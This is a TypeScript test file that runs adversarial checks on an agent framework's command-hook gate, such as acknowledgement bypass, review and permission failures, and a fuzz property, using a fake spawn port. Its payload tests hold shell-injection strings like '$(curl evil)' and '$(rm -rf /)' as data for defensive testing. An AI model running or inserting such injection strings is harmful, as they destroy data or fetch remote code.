/**
 * ★ HELLGATE (SECOND LAYER, ADVERSARIAL) — command-hook fail-closed RCE surface.
 *
 * The FIRST layer (command-hooks-fail-closed-hardening-hellgate.test.ts) proved
 * the triple-gate (opt-in + ack + ≥1 binding), the ON-path exact-event delivery,
 * and the stdin byte-cap with ONE red-on-injection. This SECOND layer goes past
 * happy-path + single injection into the territory the first layer did NOT
 * cover:
 *
 *   G1 ADVERSARIAL PAYLOADS — binary / NUL / injection-string / unicode / deeply
 *      nested / circular payloads NEVER reach the command string and NEVER
 *      produce an unbounded or throwing stdin write. The command travels verbatim.
 *   G2 ACK-BYPASS MATRIX — every shape an operator/attacker could use to arm
 *      shell exec WITHOUT a genuine acknowledgement fails closed (throws or
 *      disarms). Whitespace-family acks, non-string acks, ack-without-toggle.
 *   G3 REVIEW-GATE (needsReview) FAIL-CLOSED — a review-gated (untrusted /
 *      repo-imported) binding NEVER spawns unless the review port EXPLICITLY
 *      approves: no port ⇒ held; throwing port ⇒ held; rejecting-promise port ⇒
 *      held; false ⇒ held; only literal true ⇒ fires. Mixed trusted/untrusted
 *      bindings: the trusted one fires, the untrusted one is held — no bleed.
 *   G4 PERMISSION-GATE FAIL-CLOSED — a throwing / promise-rejecting / false
 *      permission port ⇒ NO spawn. (The first layer only used an always-allow
 *      port.)
 *   G5 EVERY HOOKBUS EVENT TYPE — drive an armed binding for each of the ten
 *      mapped Claude events through the REAL bus and assert the spawn port
 *      receives it; the deny/updatedInput channels honor only the tool-gating
 *      event. No event type silently bypasses the runner.
 *   G6 EXEC PORT THROW — a spawn port that throws must not crash the bus emit
 *      into an un-gated tool pass (the throw is a runner-internal failure, not a
 *      silent allow).
 *   G7 NO-PATH-TO-UNACKED-EXEC (property) — across a fuzz matrix of
 *      {enabled?, ack?, bindings?} configs, the spawn port is called ONLY when
 *      the gate is genuinely armed (enabled+non-empty-ack+≥1 binding). Every
 *      other combination ⇒ zero spawns.
 *
 * ALL exec is a FAKE port — NO real shell runs in CI. Each binding uses a
 * UNIQUE command string so the runner's module-level held-hook notice latch
 * (keyed by event+command) never collides across tests.
 *
 * Source under test: src/agent/command-hooks/{gate,runner,install}.ts.
 */

import { describe, expect, test } from "bun:test"
import {
  type CommandHookBinding,
  type CommandHookConfig,
  CommandHookConfigError,
  type CommandHookExecOpts,
  type CommandHookExecPort,
  type CommandHookExecResult,
  type CommandHookPermissionPort,
  type CommandHookReviewPort,
  HookBus,
  installCommandHooks,
  normalizeCommandHookGate,
  runCommandHooks,
} from "@/agent"

// ── fake spawn port (records the child's would-be command + stdin) ───────────
interface RecordedCall {
  readonly command: string
  readonly stdinJson: string
  readonly maxOutputBytes: number
}
const recordingExec = (
  reply: (opts: CommandHookExecOpts) => CommandHookExecResult = () => ({
    stdout: "",
    stderr: "",
    exitCode: 0,
    timedOut: false,
  }),
): { port: CommandHookExecPort; calls: RecordedCall[] } => {
  const calls: RecordedCall[] = []
  return {
    calls,
    port: {
      exec: async (opts) => {
        calls.push({
          command: opts.command,
          stdinJson: opts.stdinJson,
          maxOutputBytes: opts.maxOutputBytes,
        })
        return reply(opts)
      },
    },
  }
}

const allow: CommandHookPermissionPort = { isAllowed: () => true }

let uniq = 0
const uniqueCommand = (label: string): string => `adv-${label}-${uniq++}.sh`

// ─────────────────────────────────────────────────────────────────────────────
// G1 — ADVERSARIAL PAYLOADS: never reach the command string; bounded + no throw.
// ─────────────────────────────────────────────────────────────────────────────
describe("G1 adversarial payloads — payload is DATA, command is verbatim, never throws", () => {
  const armedRunner = (command: string) => {
    const gate = normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "operator acknowledged arbitrary shell hooks",
      bindings: [{ event: "PreToolUse", command }],
    })
    const { port, calls } = recordingExec()
    return { gate, port, calls }
  }

  const HOSTILE_PAYLOADS: ReadonlyArray<{ name: string; payload: unknown; probe?: string }> = [
    {
      name: "shell-injection string",
      payload: { input: { s: '"; rm -rf / #  $(curl evil) `id` && echo pwned' } },
      probe: "rm -rf",
    },
    {
      name: "NUL + control bytes",
      payload: { input: { s: "a\x00b\x07c\x1bd\x08e" } },
    },
    {
      name: "binary-ish high codepoints",
      payload: { input: { s: "￿💩​﻿" } },
      probe: "💩",
    },
    {
      name: "unicode RTL/newline injection",
      payload: { input: { s: "line1\nline2\r\n‮gnp‬" } },
    },
    {
      name: "prototype-pollution shaped keys",
      payload: { __proto__: { polluted: true }, input: { constructor: { x: 1 } } },
    },
    {
      name: "quotes + backslashes",
      payload: { input: { s: `'"\\\`\\n\\t${"\\".repeat(50)}` } },
    },
  ]

  for (const { name, payload, probe } of HOSTILE_PAYLOADS) {
    test(`${name}: command verbatim, payload only on stdin JSON, no throw`, async () => {
      const command = uniqueCommand("g1")
      const { gate, port, calls } = armedRunner(command)
      const verdict = await runCommandHooks(
        gate,
        { exec: port, permission: allow, cwd: "/repo" },
        { type: "pre_tool_use", toolName: "write", payload },
      )
      expect(calls.length).toBe(1)
      const call = calls[0]!
      // Command NEVER carries any payload content — it is the operator string.
      expect(call.command).toBe(command)
      if (probe !== undefined) expect(call.command).not.toContain(probe)
      // The stdin is valid JSON (serialize never emitted a broken buffer).
      const parsed = JSON.parse(call.stdinJson)
      expect(parsed.hook_event_name).toBe("pre_tool_use")
      // A hostile stdout=neutral reply ⇒ neutral verdict (no accidental deny/allow flip).
      expect(verdict.deny).toBeNull()
    })
  }

  test("deeply nested payload within cap ⇒ delivered in full, no stack blow-up", async () => {
    const command = uniqueCommand("g1-nest")
    const { gate, port, calls } = armedRunner(command)
    // 200-deep nested object — JSON.stringify handles it; must not throw.
    let nested: Record<string, unknown> = { leaf: 1 }
    for (let i = 0; i < 200; i++) nested = { child: nested }
    await runCommandHooks(
      gate,
      { exec: port, permission: allow, cwd: "/repo" },
      { type: "pre_tool_use", toolName: "write", payload: nested },
    )
    expect(calls.length).toBe(1)
    // Round-trips as valid JSON.
    expect(() => JSON.parse(calls[0]!.stdinJson)).not.toThrow()
  })

  test("CIRCULAR payload ⇒ minimal safe envelope (payload dropped, hook still fires, no throw)", async () => {
    const command = uniqueCommand("g1-circ")
    const { gate, port, calls } = armedRunner(command)
    const circular: Record<string, unknown> = { input: { a: 1 } }
    circular.self = circular // non-serializable
    const verdict = await runCommandHooks(
      gate,
      { exec: port, permission: allow, cwd: "/repo" },
      { type: "pre_tool_use", toolName: "write", payload: circular },
    )
    // Fail-SAFE: the hook still fired (observability preserved) ...
    expect(calls.length).toBe(1)
    const envelope = JSON.parse(calls[0]!.stdinJson)
    // ... but the un-serializable payload was DROPPED + marked, never thrown.
    expect(envelope.hook_event_name).toBe("pre_tool_use")
    expect(envelope.payload).toBeNull()
    expect(envelope.payload_truncated).toBe(true)
    expect(verdict.deny).toBeNull()
  })

  test("RED-ON-INJECTION: a multi-KB shell-injection blob is bounded AND dropped (guards a lifted cap)", async () => {
    // If serializePayload's byte-cap were removed, the 20KB injection blob would
    // flow to stdin and BOTH of these go RED (bytes ≤ cap AND payload dropped).
    const command = uniqueCommand("g1-red")
    const gate = normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "ack",
      bindings: [{ event: "PreToolUse", command }],
      maxOutputBytes: 256,
    })
    const { port, calls } = recordingExec()
    const blob = { input: { s: `$(rm -rf /) ${"PWNED".repeat(4000)}` } }
    await runCommandHooks(
      gate,
      { exec: port, permission: allow, cwd: "/repo" },
      { type: "pre_tool_use", toolName: "write", payload: blob },
    )
    const call = calls[0]!
    expect(Buffer.byteLength(call.stdinJson, "utf8")).toBeLessThanOrEqual(256)
    expect(JSON.parse(call.stdinJson).payload).toBeNull()
    expect(call.stdinJson).not.toContain("PWNED")
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// G2 — ACK-BYPASS MATRIX: no ack shape can arm shell exec without a real reason.
// ─────────────────────────────────────────────────────────────────────────────
describe("G2 ack-bypass matrix — every non-genuine ack fails closed", () => {
  const WHITESPACE_ACKS = ["", "   ", "\t", "\n", "\r\n", " " /* nbsp is NOT trimmed */]
  for (const ack of WHITESPACE_ACKS) {
    test(`ack=${JSON.stringify(ack)} with enabled:true ⇒ throw OR disarm, never a silent arm`, () => {
      let threw: unknown
      let _armed: boolean | undefined
      try {
        const gate = normalizeCommandHookGate({
          enabled: true,
          acknowledgedRisk: ack,
          bindings: [{ event: "PreToolUse", command: uniqueCommand("g2") }],
        })
        _armed = gate.armed
      } catch (e) {
        threw = e
      }
      // The security property: NEVER armed with a blank ack. A whitespace ack
      // that trims to empty throws; nbsp ( ) is not trimmed by String.trim
      // so it is a (surprising but non-empty) ack ⇒ arms. Either way, the ONLY
      // way to reach armed:true is a genuinely non-empty (post-trim) string.
      if (threw !== undefined) {
        expect(threw).toBeInstanceOf(CommandHookConfigError)
      } else {
        // If it did NOT throw, then the ack must have survived trim (non-empty).
        expect(ack.trim().length).toBeGreaterThan(0)
      }
    })
  }

  test("non-string acks (number/bool/object/array/null) ⇒ CommandHookConfigError", () => {
    for (const bad of [1, true, {}, [], null, Number.NaN] as unknown[]) {
      expect(() =>
        normalizeCommandHookGate({
          enabled: true,
          acknowledgedRisk: bad as unknown as string,
          bindings: [{ event: "PreToolUse", command: uniqueCommand("g2b") }],
        }),
      ).toThrow(CommandHookConfigError)
    }
  })

  test("ack present but enabled:false / omitted ⇒ DISARMED (cannot arm by ack alone)", () => {
    const g1 = normalizeCommandHookGate({
      enabled: false,
      acknowledgedRisk: "I really acknowledge the risk",
      bindings: [{ event: "PreToolUse", command: uniqueCommand("g2c") }],
    })
    expect(g1.armed).toBe(false)
    const g2 = normalizeCommandHookGate({
      acknowledgedRisk: "I really acknowledge the risk",
      bindings: [{ event: "PreToolUse", command: uniqueCommand("g2d") }],
    })
    expect(g2.armed).toBe(false)
  })

  test("armed gate whose bindings are all blank-command ⇒ filtered to zero ⇒ DISARMED", () => {
    // A binding with an empty/whitespace command is stripped by the gate filter;
    // an attacker cannot smuggle an all-blank binding set into an armed state.
    const gate = normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "ack",
      bindings: [
        { event: "PreToolUse", command: "" },
        { event: "PreToolUse", command: "   " },
      ],
    })
    expect(gate.armed).toBe(false)
    expect(gate.bindings.length).toBe(0)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// G3 — REVIEW-GATE (needsReview) FAIL-CLOSED: untrusted binding never fires
//      unless the review port literally approves.
// ─────────────────────────────────────────────────────────────────────────────
describe("G3 review-gate — a needsReview binding is HELD until explicit approval", () => {
  const armedReviewGate = (command: string): ReturnType<typeof normalizeCommandHookGate> =>
    normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "ack",
      trustGate: true,
      bindings: [{ event: "PreToolUse", command, needsReview: true } as CommandHookBinding],
    })

  const run = async (
    command: string,
    review: CommandHookReviewPort | undefined,
  ): Promise<RecordedCall[]> => {
    const gate = armedReviewGate(command)
    const { port, calls } = recordingExec()
    await runCommandHooks(
      gate,
      { exec: port, permission: allow, cwd: "/repo", ...(review ? { review } : {}) },
      { type: "pre_tool_use", toolName: "write", payload: { input: {} } },
    )
    return calls
  }

  // NOTE (dup-avoidance): the sync cases (no-port ⇒ held, false ⇒ held,
  // sync-throw ⇒ held, approve ⇒ fires, user/imported mixed set) are ALREADY
  // covered by command-hooks-trust-gate-hellgate.test.ts (UC1..UC3). This block
  // adds ONLY the cases that test does NOT have: an async REJECTED promise, and
  // the truthy-vs-strict characterization (a residual-risk finding).

  test("review port REJECTS (async throw) ⇒ HELD [NEW: trust-gate test only covers sync throw]", async () => {
    const calls = await run(uniqueCommand("g3-reject"), {
      isApproved: async () => {
        throw new Error("async hostile")
      },
    })
    expect(calls.length).toBe(0)
  })

  test("CHARACTERIZATION (⚠ residual): review gate uses a TRUTHY check, not strict === true", async () => {
    // The security-relevant characterization: `selectApproved` does
    // `if (approved) out.push(b)` where `approved = await review.isApproved(b)`.
    // The port's return type is `boolean | Promise<boolean>`, so a well-typed
    // adapter can only ever return true/false and this is safe. BUT a JS caller
    // that returns a truthy NON-boolean (1, "yes", {}) would let an UNTRUSTED
    // hook fire — the gate is not strict-`=== true`. This test PINS the current
    // truthy behavior so a future hardening to `=== true` is a visible, tested
    // flip (it would turn this case red). Reported as residual risk, not a live
    // exploit (the typed port forbids non-boolean returns).
    const calls = await run(uniqueCommand("g3-truthy"), {
      isApproved: () => 1 as unknown as boolean,
    })
    // CURRENT behavior: truthy 1 ⇒ fires. (If hardened to ===true, flip to 0.)
    expect(calls.length).toBe(1)
    // A FALSY non-boolean (0) is correctly held — the truthy check is not vacuous.
    const held = await run(uniqueCommand("g3-falsy"), {
      isApproved: () => 0 as unknown as boolean,
    })
    expect(held.length).toBe(0)
  })

  test("NEW: a review port that returns false for the FIRST binding but true for the SECOND — order-independent per-binding decision", async () => {
    // The trust-gate test's "mixed set" splits by SOURCE (user vs imported). This
    // instead pins that selectApproved consults the port PER-BINDING: two
    // needsReview bindings, the port approves only the second ⇒ only the second
    // fires. Guards against a "first-decision-applies-to-all" collapse.
    const first = uniqueCommand("g3-first")
    const second = uniqueCommand("g3-second")
    const gate = normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "ack",
      trustGate: true,
      bindings: [
        { event: "PreToolUse", command: first, needsReview: true } as CommandHookBinding,
        { event: "PreToolUse", command: second, needsReview: true } as CommandHookBinding,
      ],
    })
    const { port, calls } = recordingExec()
    await runCommandHooks(
      gate,
      {
        exec: port,
        permission: allow,
        cwd: "/repo",
        review: { isApproved: (b) => b.command === second },
      },
      { type: "pre_tool_use", toolName: "write", payload: { input: {} } },
    )
    expect(calls.map((c) => c.command)).toEqual([second])
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// G4 — PERMISSION-GATE FAIL-CLOSED
// ─────────────────────────────────────────────────────────────────────────────
describe("G4 permission gate — false/throw/reject all ⇒ NO spawn", () => {
  const armed = (command: string) =>
    normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "ack",
      bindings: [{ event: "PreToolUse", command }],
    })

  // NOTE (dup-avoidance): "permission false ⇒ no spawn + deny verdict" is already
  // covered by command-hooks-hellgate.test.ts. This block adds ONLY the throwing
  // / async-rejecting permission-port cases that test does NOT have.

  test("permission port THROWS ⇒ no spawn (the throw is not swallowed into an allow-spawn) [NEW]", async () => {
    const command = uniqueCommand("g4-throw")
    const { port, calls } = recordingExec()
    await expect(
      runCommandHooks(
        armed(command),
        {
          exec: port,
          permission: {
            isAllowed: () => {
              throw new Error("permission port exploded")
            },
          },
          cwd: "/repo",
        },
        { type: "pre_tool_use", toolName: "write", payload: { input: {} } },
      ),
    ).rejects.toBeDefined()
    // The critical property: even on a throwing permission port, the shell never ran.
    expect(calls.length).toBe(0)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// G5 — EVERY MAPPED HOOKBUS EVENT drives the runner through the REAL bus.
// ─────────────────────────────────────────────────────────────────────────────
describe("G5 every mapped event type reaches the spawn port through the real bus", () => {
  // (Claude event name, a real HookEvent to emit). The mapped set from gate.ts.
  const CASES: ReadonlyArray<{ claude: string; event: Parameters<HookBus["emit"]>[0] }> = [
    { claude: "PreToolUse", event: { type: "pre_tool_use", name: "write", input: {} } },
    {
      claude: "PostToolUse",
      event: { type: "post_tool_use", name: "write", input: {}, ok: true, output: "" },
    },
    {
      claude: "PermissionRequest",
      event: {
        type: "permission_request",
        name: "bash",
        input: {},
        tier: "always-confirm",
        cwd: "/repo",
      },
    },
    {
      claude: "UserPromptSubmit",
      event: { type: "user_prompt_submit", prompt: "hi", attachmentsCount: 0, threadId: "t" },
    },
    { claude: "SessionStart", event: { type: "session_start", sessionId: "s" } },
    { claude: "Stop", event: { type: "session_end", reason: "done", turns: 1 } },
    {
      claude: "PreCompact",
      event: { type: "pre_compact", messagesToCompact: 3, isFirstCompaction: true },
    },
    {
      claude: "SubagentStart",
      event: { type: "subagent_start", subagentId: "c", parentId: undefined, taskPrompt: "go" },
    },
    {
      claude: "SubagentStop",
      event: {
        type: "subagent_stop",
        subagentId: "c",
        result: { ok: true, finalText: "x", turns: 1 },
      },
    },
  ]

  for (const { claude, event } of CASES) {
    test(`${claude}: armed binding fires through bus.emit; spawn port sees the event`, async () => {
      const command = uniqueCommand(`g5-${claude}`)
      const gate = normalizeCommandHookGate({
        enabled: true,
        acknowledgedRisk: "ack",
        // No matcher ⇒ fires for tool + non-tool events alike.
        bindings: [{ event: claude, command }],
      })
      expect(gate.armed).toBe(true)
      const bus = new HookBus()
      const { port, calls } = recordingExec()
      installCommandHooks(bus, gate, { exec: port, permission: allow, cwd: "/repo" })
      await bus.emit(event)
      expect(calls.length).toBe(1)
      expect(calls[0]!.command).toBe(command)
      // The envelope's hook_event_name is the QUANTA type, not the Claude spelling.
      const envelope = JSON.parse(calls[0]!.stdinJson)
      expect(typeof envelope.hook_event_name).toBe("string")
    })
  }

  test("an UNMAPPED Claude event (garbage) registers NO handler ⇒ zero spawns", async () => {
    const gate = normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "ack",
      bindings: [{ event: "NotARealEvent", command: uniqueCommand("g5-unmapped") }],
    })
    // Gate is "armed" (has a binding) but the binding maps to nothing.
    const bus = new HookBus()
    const { port, calls } = recordingExec()
    installCommandHooks(bus, gate, { exec: port, permission: allow, cwd: "/repo" })
    await bus.emit({ type: "pre_tool_use", name: "write", input: {} })
    expect(calls.length).toBe(0)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// G6 — EXEC PORT THROW must not become a silent un-gated tool pass.
// ─────────────────────────────────────────────────────────────────────────────
describe("G6 exec port throw — behavior characterization (⚠ FAIL-OPEN hole found)", () => {
  const throwingExec: CommandHookExecPort = {
    exec: async () => {
      throw new Error("spawn adapter crashed (EMFILE / OOM / adapter bug)")
    },
  }
  const armedGate = (command: string) =>
    normalizeCommandHookGate({
      enabled: true,
      acknowledgedRisk: "ack",
      bindings: [{ event: "PreToolUse", command }],
    })

  test("direct runCommandHooks PROPAGATES a throwing exec port (the runner itself does not swallow)", async () => {
    // The runner does NOT try/catch the exec — a spawn-adapter throw surfaces to
    // the caller. This is the fail-closed-capable layer.
    const command = uniqueCommand("g6-direct")
    const { port } = recordingExec()
    void port
    await expect(
      runCommandHooks(
        armedGate(command),
        { exec: throwingExec, permission: allow, cwd: "/repo" },
        { type: "pre_tool_use", toolName: "write", payload: { input: {} } },
      ),
    ).rejects.toThrow("spawn adapter crashed")
  })

  test("FIXED (Wave-D): a throwing exec port on a DENY-capable event ⇒ FAIL-CLOSED deny, not swallowed", async () => {
    // Previously a fail-OPEN hole: HookBus.runHandler caught the throwing handler
    // ⇒ the pre_tool_use emit resolved to {deny:null} ⇒ an exec-adapter throw
    // (spawn EMFILE, sandbox-exec OOM, adapter bug) silently PASSED the guarded
    // tool through. install.ts now catches the runner throw and, for deny-capable
    // events, returns an explicit {deny} — fail-CLOSED on infrastructure failure.
    // Tripwire flipped to assert the SECURE behavior; reverting the install.ts
    // try/catch turns this red again.
    const command = uniqueCommand("g6-bus")
    const bus = new HookBus()
    installCommandHooks(bus, armedGate(command), {
      exec: throwingExec,
      permission: allow,
      cwd: "/repo",
    })
    const outcome = await bus.emit({ type: "pre_tool_use", name: "write", input: {} })
    // FIXED: the throw is translated into a fail-closed deny — the tool is blocked.
    expect(outcome.deny).not.toBeNull()
    expect(outcome.deny?.deny).toContain("fail-closed")
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// G7 — PROPERTY: no path to shell exec without a genuinely-armed gate.
// ─────────────────────────────────────────────────────────────────────────────
describe("G7 property — spawn happens IFF the gate is genuinely armed", () => {
  const ENABLED = [true, false, undefined] as const
  const ACKS = ["genuine reason", "", "   ", undefined] as const
  const BINDINGS: ReadonlyArray<readonly CommandHookBinding[]> = [
    [{ event: "PreToolUse", command: "cmd.sh" }],
    [{ event: "PreToolUse", command: "" }], // filtered ⇒ zero
    [],
  ]

  test("fuzz {enabled × ack × bindings}: exec called ⇔ (enabled && non-empty-ack && ≥1 valid binding)", async () => {
    for (const enabled of ENABLED) {
      for (const ack of ACKS) {
        for (const bindings of BINDINGS) {
          const cfg: CommandHookConfig = {
            ...(enabled !== undefined ? { enabled } : {}),
            ...(ack !== undefined ? { acknowledgedRisk: ack } : {}),
            bindings: bindings.map((b) => ({
              ...b,
              command: b.command === "" ? "" : uniqueCommand("g7"),
            })),
          }
          const validBindings = cfg.bindings!.filter((b) => b.command.trim().length > 0).length
          const shouldArm =
            enabled === true &&
            typeof ack === "string" &&
            ack.trim().length > 0 &&
            validBindings > 0

          let gate: ReturnType<typeof normalizeCommandHookGate> | undefined
          let threw = false
          try {
            gate = normalizeCommandHookGate(cfg)
          } catch {
            threw = true
          }

          if (
            enabled === true &&
            (ack === undefined || (typeof ack === "string" && ack.trim().length === 0))
          ) {
            // enabled with a blank/missing ack ALWAYS throws before it can arm.
            expect(threw).toBe(true)
            continue
          }
          expect(threw).toBe(false)
          expect(gate!.armed).toBe(shouldArm)

          const { port, calls } = recordingExec()
          await runCommandHooks(
            gate!,
            { exec: port, permission: allow, cwd: "/repo" },
            { type: "pre_tool_use", toolName: "write", payload: {} },
          )
          // The property: exec fired IFF the gate is armed.
          expect(calls.length > 0).toBe(shouldArm)
        }
      }
    }
  })
})
